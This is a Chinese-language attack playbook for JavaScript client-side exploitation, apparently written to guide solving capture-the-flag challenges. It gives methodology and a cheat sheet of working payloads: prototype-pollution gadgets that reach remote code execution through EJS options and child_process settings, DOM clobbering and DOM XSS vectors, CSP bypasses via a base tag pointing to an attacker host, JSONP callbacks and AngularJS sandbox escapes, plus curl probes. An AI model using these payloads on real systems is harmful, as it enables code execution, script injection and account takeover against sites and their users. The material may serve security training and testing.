# JavaScript 客户端攻击手册

适用题型（命中即召回本手册）：原型污染 原型链 prototype pollution __proto__ constructor.prototype merge lodash DOM XSS clobbering innerHTML eval source sink CSP bypass nonce unsafe-inline JSONP angularjs 白名单 逆向 beautifier AST 加密

## 1. 识别与分类
- 原型污染：输入被 merge/deepExtend/clone/Object.assign(JSON.parse) 深合并；查询串被 qs 转嵌套对象。
- DOM clobbering：HTML 注入存在但 XSS 被过滤；JS 依赖 window.config.xxx 等全局 DOM 变量且不校验类型。
- DOM XSS：location.hash/search/referrer/window.name/postMessage → innerHTML/document.write/eval 等 sink。
- CSP 绕过：CSP 头含 unsafe-inline/unsafe-eval、JSONP 白名单、缺 base-uri/object-src。
- JS 逆向：登录/接口参数被前端加密、混淆 JS、需找 sign/encrypt 逻辑。

## 2. 攻击方法论
### 原型污染（merge 类 sink）
1. 探测两条路径：`?__proto__[x]=1`、`?constructor[prototype][x]=1`；浏览器 console 查 `({}).x`，服务端发 `{"__proto__":{"status":510}}` 看响应码/后续请求异常。
2. 确认全局副作用：污染请求后发干净请求观察持久化（JSON 空格、CORS 头、解析行为变化）。
3. gadget 链落地：模板引擎 EJS `outputFunctionName`/`escapeFunction`→RCE；child_process 污染 `shell`/`NODE_OPTIONS`/`env`→RCE；`innerHTML`/`transport_url`→XSS；`isAdmin`/`role`→越权。

### DOM clobbering（document 属性覆盖 XSS）
1. `<form id=config><input name=apiKey value=evil>` 使 window.config.apiKey 指向 input；`<a id=config name=token href=...>` 覆盖更深属性。
2. 多级嵌套 form>input 链式覆盖；`<iframe name=x srcdoc="<a id=y href=...>">` 绕过限制；document.all 命名特性。
3. 绕过 typeof 检查：clobber 使 `typeof window.var !== "undefined"`，劫持后续 fetch/redirect 目标。

### DOM XSS（source→sink 图）
1. 找 source：location.hash/search/href、document.referrer、window.name、postMessage data、localStorage。
2. 找 sink：innerHTML/outerHTML、document.write、eval/setTimeout(string)/Function、location.assign、jQuery html()/append()、React dangerouslySetInnerHTML、Vue v-html。
3. 按上下文选 payload：HTML 体 `<svg onload=alert(1)>`；属性 `" autofocus onfocus=alert(1)//`；JS 字符串 `'-alert(1)-'`；URL `javascript:alert(1)`。

### CSP 绕过
1. 读全策略，先看显式弱点：script-src 含 unsafe-inline/unsafe-eval/data: → 直接内联/eval。
2. 缺 base-uri（无 fallback）→ 注入 `<base href=https://attacker/>` 劫持相对脚本；object-src/form-action 同样无 fallback。
3. JSONP 例外：白名单域名有 JSONP 端点 → `<script src=https://allowed/jsonp?callback=alert(1)//>`。
4. angularjs 白名单逃逸：`<script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js></script><div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>`。
5. nonce：复用/可预测→重放；CRLF 注入新 CSP；dangling markup 偷 nonce；DOM clobbering 覆盖 nonce 变量。

### JS 逆向辅助（找加密/签名）
1. beautifier 格式化：`js-beautify app.js > pretty.js`；再 grep 特征 `md5|sha|AES|RSA|CryptoJS|encrypt|sign|nonce|timestamp`。
2. 断点思路：XHR/fetch 断点看发出去的参数来源；搜关键字定位加密函数；在 console 直接调用已加载的加密函数生成参数。
3. AST/正则找逻辑：用 acorn/babel 解析后搜 CallExpression/字符串常量，还原 sign 拼接与密钥。

## 3. 变体与绕过
- `__proto__` 被过滤 → constructor.prototype 路径、JSON 多层嵌套、unicode 变体键名。
- innerHTML 过滤 script → `<img src=x onerror=alert(1)>`、`<svg onload=...>`、`<iframe src=javascript:...>`、`<details open ontoggle=...>`。
- 空格被过滤 → `<svg/onload=alert(1)>`；括号被过滤 → `onerror=alert\`1\``、`setTimeout\`...\``。
- CSP nonce 拦截 → dangling markup 偷 nonce、script gadget（受信脚本读 DOM 建 script）、strict-dynamic 配合 base-uri 缺失。
- 盲 XSS/无回显 → 外带回调（离线受限，改用同源可观测点/写 cookie 后回读）。

## 战法要点
- 见 merge/深拷贝/qs 解析先测 __proto__ 与 constructor.prototype 两条路径。
- 污染确认看全局副作用（后续干净请求），不是单请求回显。
- 原型污染到 RCE 靠模板 gadget（EJS/Pug/Handlebars），到 XSS 靠 innerHTML/transport_url。
- DOM XSS 先画 source→sink，再按上下文选 payload，别直接喷 script。
- HTML 注入被过滤但能改属性 → 试 DOM clobbering 劫持 window 变量。
- CSP 先看缺 base-uri/object-src/form-action（无 fallback），再找 JSONP 白名单。
- 前端加密用 beautifier + grep 特征定位，控制台直接调用加密函数，别硬读混淆。

## 速查清单
```text
# 原型污染
?__proto__[x]=1   ?constructor[prototype][x]=1
curl -d '{"__proto__":{"status":510}}' -H 'Content-Type: application/json' http://T/api/merge
# EJS RCE
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}
{"__proto__":{"escapeFunction":"JSON.stringify;process.mainModule.require('child_process').execSync('id')"}}
# child_process / XSS
{"__proto__":{"shell":"/proc/self/exe","NODE_OPTIONS":"--require /proc/self/environ"}}
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
# DOM clobbering
<form id=config><input name=apiKey value=evil>   <a id=config name=token href=https://evil>
# DOM XSS 上下文
<svg/onload=alert(1)>   " autofocus onfocus=alert(1)//   '-alert(1)-'   javascript:alert(1)
# CSP 绕过
<base href=https://attacker/>   <script src=https://allowed/jsonp?callback=alert(1)//>
{{constructor.constructor('alert(1)')()}}
# JS 逆向
js-beautify app.js > pretty.js; grep -nE 'md5|sha|AES|RSA|CryptoJS|encrypt|sign' pretty.js
```
